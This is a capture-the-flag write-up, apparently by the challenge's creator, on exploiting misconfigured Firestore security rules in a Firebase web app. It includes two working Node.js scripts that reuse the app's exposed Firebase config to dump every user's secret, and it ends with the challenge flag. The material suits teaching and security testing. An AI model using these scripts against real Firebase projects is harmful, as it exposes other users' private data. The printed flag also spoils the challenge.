---
slug: /articles/base-on-fire
title: Base on fire
date: 24/10/2022
category: Web
thumbnail: thumbnail.png
description: Firestore security rules misconfiguration
author: Elf
ctf: Root-Me CTF
---

# Base on fire

## Context

This is a write up for a challenge I created for the Root-Me CTF we organized to celebrate the 10k members on the Discord server. \
Please keep in mind I wasn't a participant but the creator of the challenge, hence the level of details and explainations I am able to provide. \
That was an amazing experience to help organizing this CTF, and I hope people learned a few things and enjoyed my challenges!

## Description

> The secret of my admin's account on my website has leaked, but I have no idea how! Please help me!

## Resolution

Let's go to the website and see what we can do from here.

![](not_logged.png)

To access this home page, we have to be logged in. Let's go ahead and create an account.

![](sign_up.png)

We can now access the home page where there's a feature to store a custom note for our user.

![](note.png)

If we believe the description of the challenge, there must be a way somewhere to access the notes for the other users.

Also, because the page doesn't refresh when we change our note but it's reflected against the DOM, the logic to change the note must be done from client side with an asynchronous request from JavaScript. \
Let's examine what is going on in the client side code handling this.

![](js.png)

It seems there's a lot going on here. By looking at it, we learn two things here:

- the JavaScript code has been bundled by [webpack](https://webpack.js.org/)
- the website is using [Firebase](https://firebase.google.com/)

The challenge name makes sense now: we're facing a Firebase application. Firebase is a BaaS (backend as a service), meaning it provides a full backend and a SDK to connect to it from any front end. It's a very popular choice for making web applications nowadays.

If we search for `apikey` inside this JavaScript file (or if we scroll down for a moment), we can see this piece of code:

![](config.png)

This is where the Firebase configuration is put, it contains everything that is needed to connect to the Firebase backend associated to this application. \
In addition to that, we can see it using Firebase authentication and Firestore. The authentication part is probably responsible for the sign up and login logic we've used before, while Firestore is probably the database used to store the users secrets here. \
If we continue to search for interesting things in this source code, we can find this piece of code that describes the logic of the front end. The collection used to store the secrets is therefore called... `secrets`.

![](db.png)

Now, how is handled access control to limit what can users see inside of the Firestore database? Well, for this purpose, Firebase created the [Firestore Security Rules](https://firebase.google.com/docs/firestore/security/get-started). It's a kind of very simple language that allows you to define who can access what data in what case. \
This is a very critical feature, because if these rules are misconfigured, users could access data that are not for them. \
In our case, given the description hinting that we can access the other users' secrets, we can reuse the Firebase configuration and try to connect to the project's Firestore database to see if we can access the data we want.

Let's try that!

```javascript
const { initializeApp } = require("firebase/app")
const { getAuth, signInWithEmailAndPassword } = require("firebase/auth")
const { getFirestore, collection, getDocs } = require("firebase/firestore")

async function solve() {
    const firebaseConfig = {
        apiKey: "AIzaSyAjD5umUeqn_4GV6wN4AhbsPrhSHrMPKlU",
        authDomain: "ctf-10k-root-me.firebaseapp.com",
        projectId: "ctf-10k-root-me",
        storageBucket: "ctf-10k-root-me.appspot.com",
        messagingSenderId: "985613815304",
        appId: "1:985613815304:web:6eafaeebb59763f7c5cbbd"
    }
    
    const app = initializeApp(firebaseConfig)
    const auth = getAuth(app)
    const db = getFirestore(app)
        
    const snapshot = await getDocs(collection(db, "secrets"))

    snapshot.forEach(doc => {
        console.log(doc.id, ":", doc.data())
    })
}

solve()
```

Unfortunately, we're rejected because we don't have the permission.

![](insufficient_perms.png)

It means the security rules prevent a non logged in user from accessing the `secrets` collection. But as we can obviously at least access our own secret when logged in, maybe we can in this case not only access it but also all the other secrets. Let's try it by signing in first and only then fetching the secrets.

```javascript
const { initializeApp } = require("firebase/app")
const { getAuth, signInWithEmailAndPassword } = require("firebase/auth")
const { getFirestore, collection, getDocs } = require("firebase/firestore")

const email = "osef@osef.fr"
const password = "aaaaaa"

async function solve() {
    const firebaseConfig = {
        apiKey: "AIzaSyAjD5umUeqn_4GV6wN4AhbsPrhSHrMPKlU",
        authDomain: "ctf-10k-root-me.firebaseapp.com",
        projectId: "ctf-10k-root-me",
        storageBucket: "ctf-10k-root-me.appspot.com",
        messagingSenderId: "985613815304",
        appId: "1:985613815304:web:6eafaeebb59763f7c5cbbd"
    }
    
    const app = initializeApp(firebaseConfig)
    const auth = getAuth(app)
    const db = getFirestore(app)
        
    auth.onAuthStateChanged(async user => {    
        if (user) {
            // logged in
            const snapshot = await getDocs(collection(db, "secrets"))
    
            snapshot.forEach(doc => {
                console.log(doc.id, ":", doc.data())
            })

            process.exit(0)
        }
    })

    await signInWithEmailAndPassword(auth, email, password)
}

solve()
```

And that's it! The security rules didn't prevent us from accessing all the secrets in the collection!

![](secrets.png)

You can see the flag being stored as the secret of a user named `admin` whose UID is `1_4m_th3_4dm1n_u1d`, and you also won the right to read all the notes of the participants as a bonus, there are a few funny ones in it. 8)

Flag: `RM{s3cur1ty_rul3s_m1sc0nf1gur4t10n}`